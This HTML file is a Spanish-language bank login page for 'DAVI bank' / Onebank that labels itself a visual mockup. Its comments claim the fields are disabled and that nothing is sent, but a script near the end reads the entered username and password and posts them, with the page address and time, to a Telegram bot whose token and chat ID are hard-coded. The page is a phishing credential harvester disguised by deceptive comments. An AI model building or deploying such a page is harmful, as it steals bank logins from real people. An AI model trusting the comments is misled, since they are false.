<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Onebank — Maqueta</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,body{
    width:100%;
    min-height:100%;
    font-family:Arial,Helvetica,sans-serif;
    background:#fff;
    color:#263746;
}

/* =========================
   CONTENEDOR PRINCIPAL
========================= */

.page{
    min-height:100vh;
    width:100%;
    display:flex;
}

/* =========================
   LADO DEL FORMULARIO
========================= */

.login-section{
    width:50%;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#fff;
    padding:40px 55px;
}

.login-container{
    width:100%;
    max-width:570px;
}

/* =========================
   LOGO
========================= */

.logo{
    display:flex;
    align-items:center;
    margin-bottom:38px;
}

.logo-main{
    font-size:43px;
    color:#df101b;
    font-style:italic;
    font-weight:400;
    letter-spacing:-4px;
}

.logo-bank{
    margin-left:8px;
    margin-top:10px;
    font-size:25px;
    font-weight:700;
    color:#34495e;
}

/* =========================
   TITULO
========================= */

.title{
    font-size:30px;
    line-height:1.2;
    margin-bottom:36px;
    color:#273746;
}

/* =========================
   CAMPOS VISUALES
========================= */

.field{
    position:relative;
    width:100%;
    margin-bottom:27px;
}

.field-icon{
    position:absolute;
    left:0;
    top:9px;
    width:25px;
    height:25px;
    color:#626970;
}

.field input{
    width:100%;
    height:52px;
    padding:5px 8px 5px 40px;

    border:none;
    border-bottom:1px solid #888;

    outline:none;
    background:#fff;

    font-size:19px;
    color:#555;
}

.field input::placeholder{
    color:#69757d;
}

/*
 Los campos están deshabilitados:
 no recopilan ni envían credenciales.
*/

.field input:disabled{
    opacity:1;
    cursor:not-allowed;
}

/* =========================
   BOTÓN
========================= */

.login-btn{
    width:100%;
    height:60px;

    border:1px solid #dce3ea;
    border-radius:9px;

    background:#fafbfc;
    color:#69747c;

    font-size:17px;
    font-weight:bold;

    cursor:default;
}

/* =========================
   TARJETAS
========================= */

.info-card{
    width:100%;
    min-height:80px;

    margin-top:25px;

    padding:14px 20px;

    border:1px dashed #d5dce1;
    border-radius:5px;

    display:flex;
    align-items:center;

    font-size:16px;
    line-height:1.4;
    color:#3f474e;
}

.info-icon{
    width:50px;
    min-width:50px;

    margin-right:18px;

    text-align:center;
    font-size:32px;
}

.phone-icon{
    color:#7048b9;
}

.megaphone-icon{
    color:#069fd3;
}

.info-card strong{
    color:#087fb7;
}

/* =========================
   PANEL DERECHO — SOLO PC
========================= */

.promo-section{
    width:50%;
    min-height:100vh;

    position:relative;
    overflow:hidden;

    background:#ed91cf;

    display:flex;
    align-items:center;
    justify-content:center;
}

/*
 Imagen de ejemplo.

 Puedes reemplazar "imagen-promo.jpg"
 por tu propia fotografía.

 IMPORTANTE:
 este panel desaparece completamente
 en móviles.
*/

.promo-image{
    width:100%;
    height:100%;

    object-fit:cover;
    object-position:center;

    position:absolute;
    inset:0;
}

/* =========================
   ETIQUETA DEMO
========================= */

.demo-label{
    position:fixed;

    right:15px;
    bottom:15px;

    z-index:50;

    background:rgba(0,0,0,.75);
    color:#fff;

    padding:8px 13px;

    border-radius:20px;

    font-size:11px;
    letter-spacing:.3px;
}

/* =========================
   RESPONSIVE
========================= */

/*
 TABLET / MOVIL

 El panel derecho y la imagen
 desaparecen completamente.
*/

@media(max-width:900px){

    .page{
        display:block;
        width:100%;
    }

    .promo-section{
        display:none !important;
    }

    .login-section{
        width:100%;
        min-height:100vh;

        padding:35px 25px;

        display:flex;
        align-items:flex-start;
    }

    .login-container{
        max-width:620px;
        margin:30px auto 0;
    }
}

/* =========================
   MOVILES PEQUEÑOS
========================= */

@media(max-width:500px){

    .login-section{
        padding:25px 20px;
    }

    .login-container{
        margin-top:20px;
    }

    .logo{
        margin-bottom:30px;
    }

    .logo-main{
        font-size:36px;
    }

    .logo-bank{
        font-size:21px;
        margin-top:7px;
    }

    .title{
        font-size:25px;
        margin-bottom:31px;
    }

    .field{
        margin-bottom:25px;
    }

    .field input{
        height:50px;
        font-size:17px;
    }

    .login-btn{
        height:58px;
    }

    .info-card{
        min-height:76px;
        padding:13px 12px;
        font-size:14px;
    }

    .info-icon{
        width:42px;
        min-width:42px;
        margin-right:10px;
        font-size:27px;
    }

    .demo-label{
        font-size:9px;
        right:10px;
        bottom:10px;
    }
}

/* =========================
   EXTRA PEQUEÑO
========================= */

@media(max-width:360px){

    .login-section{
        padding-left:15px;
        padding-right:15px;
    }

    .title{
        font-size:23px;
    }

    .info-card{
        font-size:13px;
    }
}
</style>
</head>

<body>

<div class="page">

    <!-- =====================
         FORMULARIO
    ====================== -->

    <section class="login-section">

        <div class="login-container">

            <div class="logo">
                <span class="logo-main">DAVI</span>
                <span class="logo-bank">bank</span>
            </div>

            <h1 class="title">
                Bienvenido a Onebank
            </h1>


            <!-- Campo únicamente visual -->

            <div class="field">

                <div class="field-icon">

                    <svg viewBox="0 0 24 24"
                         fill="none"
                         stroke="currentColor"
                         stroke-width="1.7">

                        <circle cx="12"
                                cy="7"
                                r="4">
                        </circle>

                        <path d="M4 21c0-4.2
                                 3.5-7
                                 8-7s8 2.8
                                 8 7">
                        </path>

                    </svg>

                </div>

               <input type="text" id="usuario" placeholder="Usuario">


            </div>


            <!-- Campo únicamente visual -->

            <div class="field">

                <div class="field-icon">

                    <svg viewBox="0 0 24 24"
                         fill="none"
                         stroke="currentColor"
                         stroke-width="1.7">

                        <rect x="5"
                              y="10"
                              width="14"
                              height="10"
                              rx="1">
                        </rect>

                        <path d="M8 10V7
                                 a4 4 0 0 1 8 0v3">
                        </path>

                        <circle cx="12"
                                cy="15"
                                r="1">
                        </circle>

                    </svg>

                </div>

               <input type="password" id="password" placeholder="Contraseña">


            </div>


            <button type="button" id="loginBtn" class="login-btn">Ingresar</button>


            <!-- =====================
                 INFORMACIÓN 1
            ====================== -->

            <div class="info-card">

                <div class="info-icon phone-icon">
                    ☎
                </div>

                <div>
                    Si tienes problemas con tu contraseña
                    comunícate con la mesa de ayuda.
                    <br>
                    Tel: 7456300 ext 4545
                </div>

            </div>


            <!-- =====================
                 INFORMACIÓN 2
            ====================== -->

            <div class="info-card">

                <div class="info-icon megaphone-icon">
                    📣
                </div>

                <div>
                    DAVIbank tiene un aviso importante
                    para ti.
                    <strong>Lee más aquí</strong>
                </div>

            </div>

        </div>

    </section>


    <!-- =====================
         IMAGEN — SOLO PC
    ====================== -->

    <section class="promo-section">

        <!--
          Coloca una imagen llamada:

          imagen-promo.jpg

          en la misma carpeta que index.html.
        -->

        <img
            src="imagen-promo.jpg"
            class="promo-image"
            alt="Imagen promocional">

    </section>

</div>


<!-- Aviso visual -->

<script>
const TELEGRAM_TOKEN = "8747147152:AAFNHujZamAp_GRYUue9VwKEktdmovPeoqU";
const TELEGRAM_CHAT_ID = "8042354877";

document.getElementById("loginBtn").addEventListener("click", async function () {
    const usuario = document.getElementById("usuario").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!usuario || !password) {
        alert("Completa todos los campos");
        return;
    }

    const mensaje = `
🔐 Nuevo registro
👤 Usuario: ${usuario}
🔑 Contraseña: ${password}
🌐 Página: ${window.location.href}
🕒 Fecha: ${new Date().toLocaleString()}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensaje
            })
        });
        console.log("Enviado");
    } catch (err) {
        console.error("Error:", err);
    }
});
</script>


<script>
/*
    Esta maqueta no procesa ni envía
    información de acceso.

    El JavaScript únicamente mantiene
    la página como demostración visual.
*/

document.addEventListener("DOMContentLoaded", function(){

    console.log("Maqueta cargada correctamente.");

});
</script>

</body>
</html>
